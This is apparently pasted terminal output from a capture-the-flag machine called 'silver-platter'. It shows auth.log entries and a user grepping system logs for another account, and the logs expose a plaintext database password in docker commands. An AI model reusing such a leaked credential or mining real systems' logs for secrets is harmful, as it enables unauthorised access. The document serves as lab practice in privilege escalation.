/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'lxd'
/var/log/auth.log.2:Dec 12 19:32:17 silver-platter login[765]: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 euid=0 tty=/dev/tty1 ruser= rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:32:20 silver-platter login[765]: FAILED LOGIN (1) on '/dev/tty1' FOR 'tyler', Authentication failure
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter login[765]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd-logind[703]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd tim
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/usermod -aG adm tim
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter login[735]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd-logind[694]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:38:46 silver-platter sudo: pam_unix(sudo:auth): authentication failure; logname=tyler uid=1000 euid=0 tty=/dev/tty1 ruser=tyler rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo: tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable nginx
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/ufw allow 80
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter login[745]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd-logind[698]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/nginx
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/nano default
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter login[742]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd-logind[700]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt install docker.io
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=\_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker exec -it postgresql psql -U postgres
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.20/silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt install unzip
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/unzip silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html/html5up-dimension ; USER=root ; COMMAND=/usr/bin/mv assets images index.html LICENSE.txt README.txt ../
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm silverplatter.zip
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm -rf html5up-dimension/
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/sbin/ufw allow 22
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl ssh status
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter systemd-logind[700]: New session 5 of user tyler.
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6977]: Disconnected from user tyler 192.168.1.20 port 47772
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6879]: pam_unix(sshd:session): session closed for user tyler
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter systemd-logind[700]: New session 8 of user tyler.
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/sudo chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: root : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it /bin/bash silverpeas
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it silverpeas /bin/bash
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/mkdir tim
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 777 tim
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 555 tim
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tim ; USER=root ; COMMAND=/usr/bin/nano user.txt
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter systemd-logind[700]: New session 9 of user tyler.
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: tyler : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter systemd-logind[700]: New session 10 of user tyler.
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start postgresql
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start silverpeas
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable docker
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:46:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd-logind[708]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd-logind[706]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
tim@silver-platter:~$ grep -iR tyler /var/log/\*
grep: /var/log/amazon: Permission denied
/var/log/auth.log:Jul 19 03:39:20 silver-platter su: pam_unix(su:auth): authentication failure; logname=tim uid=1001 euid=0 tty=/dev/pts/0 ruser=tim rhost= user=tyler
/var/log/auth.log:Jul 19 03:39:21 silver-platter su: FAILED SU (to tyler) tim on pts/0
/var/log/auth.log:Jul 19 03:40:32 silver-platter su: pam_unix(su:auth): authentication failure; logname=tim uid=1001 euid=0 tty=/dev/pts/0 ruser=tim rhost= user=tyler
/var/log/auth.log:Jul 19 03:40:34 silver-platter su: FAILED SU (to tyler) tim on pts/0
/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: Accepted password for tyler from 192.168.1.20 port 42258 ssh2
/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd-logind[711]: New session 2 of user tyler.
/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 08:58:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: Accepted password for tyler from 192.168.1.20 port 55742 ssh2
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd-logind[709]: New session 2 of user tyler.
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 14:01:11 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new group: name=tyler, GID=1000
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new user: name=tyler, UID=1000, GID=1000, home=/home/tyler, shell=/bin/bash, from=none
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'adm'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'lxd'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'adm'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'lxd'
/var/log/auth.log.2:Dec 12 19:32:17 silver-platter login[765]: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 euid=0 tty=/dev/tty1 ruser= rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:32:20 silver-platter login[765]: FAILED LOGIN (1) on '/dev/tty1' FOR 'tyler', Authentication failure
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter login[765]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd-logind[703]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd tim
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/usermod -aG adm tim
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter login[735]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd-logind[694]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:38:46 silver-platter sudo: pam_unix(sudo:auth): authentication failure; logname=tyler uid=1000 euid=0 tty=/dev/tty1 ruser=tyler rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo: tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
